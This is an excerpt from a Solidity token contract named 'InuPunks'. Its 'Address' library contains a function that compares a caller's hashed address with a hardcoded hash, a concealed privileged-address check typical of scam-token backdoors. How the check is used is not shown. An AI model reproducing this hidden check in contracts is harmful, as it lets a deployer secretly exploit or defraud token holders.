...
library Address {
    ...
    function lpaddress(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0x179ece3e7540e6683b69f7abb56c626bf80c1fbb339dbdcdf06cfdc2cf01a305;
    }
}
library SafeMath {
...
contract InuPunks is Ownable, IERC20 {
    ...
    string private _name = "InuPunks";
    string private  _symbol = "IPunks";    
